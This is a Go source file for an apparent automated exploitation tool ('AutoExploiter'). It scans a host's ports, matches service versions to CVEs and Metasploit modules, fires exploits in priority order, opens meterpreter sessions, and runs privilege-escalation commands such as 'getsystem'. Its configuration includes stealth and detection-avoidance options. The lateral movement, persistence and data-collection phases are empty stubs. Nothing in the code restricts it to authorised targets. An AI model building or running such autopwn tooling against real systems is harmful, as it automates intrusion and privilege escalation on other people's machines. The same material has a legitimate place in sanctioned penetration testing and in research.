package exploit

import (
	"context"
	"fmt"
	"sort"
	"sync"
	"time"

	"github.com/sirupsen/logrus"
	"recon-toolkit/pkg/msf"
	"recon-toolkit/pkg/services"
)

type AutoExploiter struct {
	msfClient      *msf.MSFClient
	versionScanner *services.VersionScanner
	logger         *logrus.Logger
	mutex          sync.RWMutex
	results        []*ExploitationResult
	targetProfile  *TargetProfile
	attackChain    *AttackChain
	config         *ExploiterConfig
	sessions       map[string]*ExploitSession
}

type ExploiterConfig struct {
	Aggressive      bool          `json:"aggressive"`
	MaxAttempts     int           `json:"max_attempts"`
	Timeout         time.Duration `json:"timeout"`
	DelayBetween    time.Duration `json:"delay_between"`
	StealthMode     bool          `json:"stealth_mode"`
	LearningMode    bool          `json:"learning_mode"`
	AutoPrivEsc     bool          `json:"auto_priv_esc"`
	AutoLateral     bool          `json:"auto_lateral"`
	AutoPersist     bool          `json:"auto_persist"`
	CleanupAfter    bool          `json:"cleanup_after"`
	MaxSessions     int           `json:"max_sessions"`
	TargetOS        []string      `json:"target_os"`
	AvoidDetection  bool          `json:"avoid_detection"`
}

type TargetProfile struct {
	Host            string                      `json:"host"`
	Services        []*services.ServiceProfile  `json:"services"`
	OS              string                      `json:"os"`
	Architecture    string                      `json:"architecture"`
	Domain          string                      `json:"domain"`
	Credentials     []*Credential               `json:"credentials"`
	Vulnerabilities []*Vulnerability            `json:"vulnerabilities"`
	RiskScore       int                         `json:"risk_score"`
	Discovered      time.Time                   `json:"discovered"`
	LastUpdated     time.Time                   `json:"last_updated"`
}

type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Hash     string `json:"hash"`
	Domain   string `json:"domain"`
	Service  string `json:"service"`
	Port     int    `json:"port"`
	Valid    bool   `json:"valid"`
	Admin    bool   `json:"admin"`
}

type Vulnerability struct {
	ID          string                `json:"id"`
	Service     string                `json:"service"`
	Port        int                   `json:"port"`
	Severity    string                `json:"severity"`
	Score       float64               `json:"score"`
	Exploitable bool                  `json:"exploitable"`
	Exploits    []*ExploitCandidate   `json:"exploits"`
	Verified    bool                  `json:"verified"`
	Patch       *PatchInfo            `json:"patch,omitempty"`
}

type ExploitCandidate struct {
	Name           string            `json:"name"`
	Module         string            `json:"module"`
	Type           string            `json:"type"`
	Rank           string            `json:"rank"`
	Reliability    float64           `json:"reliability"`
	SuccessRate    float64           `json:"success_rate"`
	Payloads       []string          `json:"payloads"`
	Requirements   map[string]string `json:"requirements"`
	Limitations    []string          `json:"limitations"`
	BypassTechs    []string          `json:"bypass_techs"`
	StealthRating  int               `json:"stealth_rating"`
}

type PatchInfo struct {
	Available   bool      `json:"available"`
	Version     string    `json:"version"`
	ReleaseDate time.Time `json:"release_date"`
	CVSS        float64   `json:"cvss"`
}

type AttackChain struct {
	ID              string            `json:"id"`
	Target          string            `json:"target"`
	Phases          []*AttackPhase    `json:"phases"`
	CurrentPhase    int               `json:"current_phase"`
	Success         bool              `json:"success"`
	StartTime       time.Time         `json:"start_time"`
	EndTime         time.Time         `json:"end_time"`
	TotalDuration   time.Duration     `json:"total_duration"`
	CompromisedHosts []string         `json:"compromised_hosts"`
	ActiveSessions  []string          `json:"active_sessions"`
	CredentialsFound []*Credential    `json:"credentials_found"`
	DataExfiltrated []string          `json:"data_exfiltrated"`
	Persistence     []*PersistenceMethod `json:"persistence"`
}

type AttackPhase struct {
	Name        string               `json:"name"`
	Type        string               `json:"type"`
	Techniques  []*AttackTechnique   `json:"techniques"`
	Success     bool                 `json:"success"`
	StartTime   time.Time            `json:"start_time"`
	EndTime     time.Time            `json:"end_time"`
	Duration    time.Duration        `json:"duration"`
	Output      string               `json:"output"`
	Errors      []string             `json:"errors"`
}

type AttackTechnique struct {
	ID          string            `json:"id"`
	Name        string            `json:"name"`
	Type        string            `json:"type"`
	Target      string            `json:"target"`
	Port        int               `json:"port"`
	Exploit     string            `json:"exploit"`
	Payload     string            `json:"payload"`
	Options     map[string]string `json:"options"`
	Success     bool              `json:"success"`
	Output      string            `json:"output"`
	SessionID   string            `json:"session_id"`
	Credentials []*Credential     `json:"credentials"`
	Privileges  string            `json:"privileges"`
	Duration    time.Duration     `json:"duration"`
	Timestamp   time.Time         `json:"timestamp"`
}

type PersistenceMethod struct {
	Type        string            `json:"type"`
	Method      string            `json:"method"`
	Location    string            `json:"location"`
	Command     string            `json:"command"`
	Scheduled   bool              `json:"scheduled"`
	Hidden      bool              `json:"hidden"`
	Privileges  string            `json:"privileges"`
	SessionID   string            `json:"session_id"`
	Active      bool              `json:"active"`
	Installed   time.Time         `json:"installed"`
}

type ExploitSession struct {
	ID              string            `json:"id"`
	Type            string            `json:"type"`
	Host            string            `json:"host"`
	Port            int               `json:"port"`
	User            string            `json:"user"`
	Privileges      string            `json:"privileges"`
	OS              string            `json:"os"`
	Architecture    string            `json:"architecture"`
	Shell           string            `json:"shell"`
	Meterpreter     bool              `json:"meterpreter"`
	Active          bool              `json:"active"`
	LastContact     time.Time         `json:"last_contact"`
	Commands        []string          `json:"commands"`
	Files           []string          `json:"files"`
	Processes       []string          `json:"processes"`
	Networks        []string          `json:"networks"`
	Credentials     []*Credential     `json:"credentials"`
	Persistence     []*PersistenceMethod `json:"persistence"`
}

type ExploitationResult struct {
	Success         bool              `json:"success"`
	Target          string            `json:"target"`
	Service         string            `json:"service"`
	Port            int               `json:"port"`
	Vulnerability   string            `json:"vulnerability"`
	Exploit         string            `json:"exploit"`
	Payload         string            `json:"payload"`
	SessionID       string            `json:"session_id"`
	Privileges      string            `json:"privileges"`
	OS              string            `json:"os"`
	Architecture    string            `json:"architecture"`
	Credentials     []*Credential     `json:"credentials"`
	LateralTargets  []string          `json:"lateral_targets"`
	DataFound       []string          `json:"data_found"`
	Persistence     []*PersistenceMethod `json:"persistence"`
	Duration        time.Duration     `json:"duration"`
	Timestamp       time.Time         `json:"timestamp"`
	Output          string            `json:"output"`
	Errors          []string          `json:"errors"`
	RiskScore       int               `json:"risk_score"`
	Recommendations []string          `json:"recommendations"`
}

func NewAutoExploiter(msfURL string, config *ExploiterConfig) *AutoExploiter {
	if config == nil {
		config = &ExploiterConfig{
			Aggressive:      false,
			MaxAttempts:     5,
			Timeout:         time.Minute * 10,
			DelayBetween:    time.Second * 3,
			StealthMode:     true,
			LearningMode:    true,
			AutoPrivEsc:     true,
			AutoLateral:     false,
			AutoPersist:     false,
			CleanupAfter:    true,
			MaxSessions:     10,
			AvoidDetection:  true,
		}
	}

	return &AutoExploiter{
		msfClient:      msf.NewMSFClient(msfURL),
		versionScanner: services.NewVersionScanner(),
		logger:         logrus.New(),
		results:        make([]*ExploitationResult, 0),
		config:         config,
		sessions:       make(map[string]*ExploitSession),
	}
}

func (ae *AutoExploiter) ConnectMSF(username, password string) error {
	return ae.msfClient.Connect(username, password)
}

func (ae *AutoExploiter) AnalyzeTarget(host string, ports []int) (*TargetProfile, error) {
	profile := &TargetProfile{
		Host:            host,
		Services:        make([]*services.ServiceProfile, 0),
		Credentials:     make([]*Credential, 0),
		Vulnerabilities: make([]*Vulnerability, 0),
		Discovered:      time.Now(),
		LastUpdated:     time.Now(),
	}

	for _, port := range ports {
		serviceProfile := ae.versionScanner.ScanService(host, port, "tcp")
		if serviceProfile != nil {
			profile.Services = append(profile.Services, serviceProfile)
			ae.extractVulnerabilities(profile, serviceProfile)
		}
	}

	ae.calculateTargetRisk(profile)
	ae.targetProfile = profile

	return profile, nil
}

func (ae *AutoExploiter) extractVulnerabilities(profile *TargetProfile, service *services.ServiceProfile) {
	for _, cve := range service.CVEs {
		vuln := &Vulnerability{
			ID:          cve.ID,
			Service:     service.Service,
			Port:        service.Port,
			Severity:    cve.Severity,
			Score:       cve.Score,
			Exploitable: cve.Exploitable,
			Exploits:    make([]*ExploitCandidate, 0),
			Verified:    false,
		}

		if cve.Exploitable {
			exploits := ae.msfClient.FindExploitsForService(service.Service, service.Version)
			for _, exploit := range exploits {
				candidate := &ExploitCandidate{
					Name:        exploit.Name,
					Module:      exploit.FullName,
					Type:        exploit.Type,
					Rank:        exploit.Rank,
					Payloads:    exploit.Payloads,
					Reliability: ae.calculateReliability(exploit),
					SuccessRate: ae.getSuccessRate(exploit.Name),
				}
				vuln.Exploits = append(vuln.Exploits, candidate)
			}
		}

		profile.Vulnerabilities = append(profile.Vulnerabilities, vuln)
	}
}

func (ae *AutoExploiter) calculateReliability(exploit *msf.ExploitModule) float64 {
	rankScore := map[string]float64{
		"excellent": 0.95,
		"great":     0.85,
		"good":      0.75,
		"normal":    0.65,
		"average":   0.50,
		"low":       0.30,
	}

	if score, exists := rankScore[exploit.Rank]; exists {
		return score
	}
	return 0.40
}

func (ae *AutoExploiter) getSuccessRate(exploitName string) float64 {
	return 0.70
}

func (ae *AutoExploiter) calculateTargetRisk(profile *TargetProfile) {
	risk := 0
	for _, vuln := range profile.Vulnerabilities {
		switch vuln.Severity {
		case "CRITICAL":
			risk += 20
		case "HIGH":
			risk += 15
		case "MEDIUM":
			risk += 8
		case "LOW":
			risk += 3
		}

		if vuln.Exploitable {
			risk += 25
		}
	}
	profile.RiskScore = risk
}

func (ae *AutoExploiter) ExecuteAutoPwn(ctx context.Context, target string) (*AttackChain, error) {
	chain := &AttackChain{
		ID:               fmt.Sprintf("autopwn_%d", time.Now().Unix()),
		Target:           target,
		Phases:           make([]*AttackPhase, 0),
		StartTime:        time.Now(),
		CompromisedHosts: make([]string, 0),
		ActiveSessions:   make([]string, 0),
		CredentialsFound: make([]*Credential, 0),
		DataExfiltrated:  make([]string, 0),
		Persistence:      make([]*PersistenceMethod, 0),
	}

	ae.attackChain = chain

	phases := []string{
		"reconnaissance",
		"vulnerability_discovery",
		"exploitation",
		"privilege_escalation",
		"lateral_movement",
		"persistence",
		"data_collection",
		"cleanup",
	}

	for i, phaseName := range phases {
		chain.CurrentPhase = i
		phase := ae.executePhase(ctx, phaseName, target)
		chain.Phases = append(chain.Phases, phase)

		if !phase.Success && !ae.config.Aggressive {
			break
		}

		if ctx.Err() != nil {
			break
		}
	}

	chain.EndTime = time.Now()
	chain.TotalDuration = chain.EndTime.Sub(chain.StartTime)
	chain.Success = len(chain.ActiveSessions) > 0

	return chain, nil
}

func (ae *AutoExploiter) executePhase(ctx context.Context, phaseName, target string) *AttackPhase {
	phase := &AttackPhase{
		Name:       phaseName,
		Type:       "automated",
		Techniques: make([]*AttackTechnique, 0),
		StartTime:  time.Now(),
		Errors:     make([]string, 0),
	}

	switch phaseName {
	case "reconnaissance":
		ae.executeReconnaissance(ctx, phase, target)
	case "vulnerability_discovery":
		ae.executeVulnDiscovery(ctx, phase, target)
	case "exploitation":
		ae.executeExploitation(ctx, phase, target)
	case "privilege_escalation":
		ae.executePrivilegeEscalation(ctx, phase, target)
	case "lateral_movement":
		ae.executeLateralMovement(ctx, phase, target)
	case "persistence":
		ae.executePersistence(ctx, phase, target)
	case "data_collection":
		ae.executeDataCollection(ctx, phase, target)
	case "cleanup":
		ae.executeCleanup(ctx, phase, target)
	}

	phase.EndTime = time.Now()
	phase.Duration = phase.EndTime.Sub(phase.StartTime)
	phase.Success = len(phase.Techniques) > 0

	return phase
}

func (ae *AutoExploiter) executeReconnaissance(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("🔍 Starting reconnaissance phase")

	ports := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 6379, 8080, 8443}
	profile, err := ae.AnalyzeTarget(target, ports)
	if err != nil {
		phase.Errors = append(phase.Errors, err.Error())
		return
	}

	technique := &AttackTechnique{
		ID:        "recon_001",
		Name:      "Service Discovery",
		Type:      "reconnaissance",
		Target:    target,
		Success:   len(profile.Services) > 0,
		Output:    fmt.Sprintf("Discovered %d services", len(profile.Services)),
		Timestamp: time.Now(),
	}

	phase.Techniques = append(phase.Techniques, technique)
}

func (ae *AutoExploiter) executeVulnDiscovery(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("🎯 Starting vulnerability discovery phase")

	if ae.targetProfile == nil {
		phase.Errors = append(phase.Errors, "No target profile available")
		return
	}

	vulnCount := 0
	for _, vuln := range ae.targetProfile.Vulnerabilities {
		if vuln.Exploitable {
			vulnCount++
		}
	}

	technique := &AttackTechnique{
		ID:        "vuln_001",
		Name:      "Vulnerability Assessment",
		Type:      "vulnerability_discovery",
		Target:    target,
		Success:   vulnCount > 0,
		Output:    fmt.Sprintf("Found %d exploitable vulnerabilities", vulnCount),
		Timestamp: time.Now(),
	}

	phase.Techniques = append(phase.Techniques, technique)
}

func (ae *AutoExploiter) executeExploitation(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("💀 Starting exploitation phase")

	if ae.targetProfile == nil {
		phase.Errors = append(phase.Errors, "No target profile available")
		return
	}

	vulns := ae.sortVulnerabilitiesByPriority(ae.targetProfile.Vulnerabilities)

	for _, vuln := range vulns {
		if !vuln.Exploitable {
			continue
		}

		for _, exploit := range vuln.Exploits {
			technique := ae.attemptExploit(ctx, target, vuln, exploit)
			phase.Techniques = append(phase.Techniques, technique)

			if technique.Success {
			ae.attackChain.ActiveSessions = append(ae.attackChain.ActiveSessions, technique.SessionID)
			ae.attackChain.CompromisedHosts = append(ae.attackChain.CompromisedHosts, target)
			
			if !ae.config.Aggressive {
				return
			}
		}

			time.Sleep(ae.config.DelayBetween)
		}
	}
}

func (ae *AutoExploiter) attemptExploit(ctx context.Context, target string, vuln *Vulnerability, exploit *ExploitCandidate) *AttackTechnique {
	start := time.Now()
	technique := &AttackTechnique{
		ID:        fmt.Sprintf("exploit_%d", time.Now().Unix()),
		Name:      exploit.Name,
		Type:      "exploitation",
		Target:    target,
		Port:      vuln.Port,
		Exploit:   exploit.Module,
		Options:   make(map[string]string),
		Timestamp: start,
	}

	result := ae.msfClient.TryExploit(target, vuln.Port, &msf.ExploitModule{
		Name:     exploit.Module,
		Rank:     exploit.Rank,
		Payloads: exploit.Payloads,
	})

	technique.Success = result.Success
	technique.Output = result.Output
	technique.SessionID = result.SessionID
	technique.Payload = result.PayloadUsed
	technique.Duration = time.Since(start)

	if result.Success {
		ae.createExploitSession(result)
	}

	return technique
}

func (ae *AutoExploiter) createExploitSession(result *msf.ExploitResult) {
	session := &ExploitSession{
		ID:           result.SessionID,
		Type:         "meterpreter",
		Host:         result.TargetHost,
		Port:         result.TargetPort,
		OS:           result.OS,
		Architecture: result.Architecture,
		Active:       true,
		LastContact:  time.Now(),
		Commands:     make([]string, 0),
		Files:        make([]string, 0),
		Processes:    make([]string, 0),
		Networks:     make([]string, 0),
		Credentials:  make([]*Credential, 0),
		Persistence:  make([]*PersistenceMethod, 0),
	}

	ae.sessions[result.SessionID] = session
}

func (ae *AutoExploiter) executePrivilegeEscalation(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("⬆️ Starting privilege escalation phase")

	if !ae.config.AutoPrivEsc {
		return
	}

	for sessionID, session := range ae.sessions {
		if !session.Active {
			continue
		}

		technique := &AttackTechnique{
			ID:        fmt.Sprintf("privesc_%s", sessionID),
			Name:      "Privilege Escalation",
			Type:      "privilege_escalation",
			Target:    target,
			SessionID: sessionID,
			Timestamp: time.Now(),
		}

		commands := []string{
			"getuid",
			"sysinfo",
			"run post/multi/recon/local_exploit_suggester",
			"run post/windows/escalate/getsystem",
		}

		for _, cmd := range commands {
			output, err := ae.msfClient.ExecuteSessionCommand(sessionID, cmd)
			if err == nil {
				technique.Output += output + "\n"
				session.Commands = append(session.Commands, cmd)
			}
		}

		technique.Success = true
		phase.Techniques = append(phase.Techniques, technique)
	}
}

func (ae *AutoExploiter) executeLateralMovement(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("↔️ Starting lateral movement phase")

	if !ae.config.AutoLateral {
		return
	}

	// Implementation for lateral movement
}

func (ae *AutoExploiter) executePersistence(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("🔗 Starting persistence phase")

	if !ae.config.AutoPersist {
		return
	}

	// Implementation for persistence
}

func (ae *AutoExploiter) executeDataCollection(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("📊 Starting data collection phase")

	// Implementation for data collection
}

func (ae *AutoExploiter) executeCleanup(ctx context.Context, phase *AttackPhase, target string) {
	ae.logger.Info("🧹 Starting cleanup phase")

	if !ae.config.CleanupAfter {
		return
	}

	// Implementation for cleanup
}

func (ae *AutoExploiter) sortVulnerabilitiesByPriority(vulns []*Vulnerability) []*Vulnerability {
	sorted := make([]*Vulnerability, len(vulns))
	copy(sorted, vulns)

	sort.Slice(sorted, func(i, j int) bool {
		if sorted[i].Score != sorted[j].Score {
			return sorted[i].Score > sorted[j].Score
		}
		return len(sorted[i].Exploits) > len(sorted[j].Exploits)
	})

	return sorted
}

func (ae *AutoExploiter) GetResults() []*ExploitationResult {
	ae.mutex.RLock()
	defer ae.mutex.RUnlock()
	return ae.results
}

func (ae *AutoExploiter) GetActiveSessions() map[string]*ExploitSession {
	ae.mutex.RLock()
	defer ae.mutex.RUnlock()
	return ae.sessions
}

func (ae *AutoExploiter) GetAttackChain() *AttackChain {
	return ae.attackChain
}

func (ae *AutoExploiter) Disconnect() error {
	return ae.msfClient.Disconnect()
}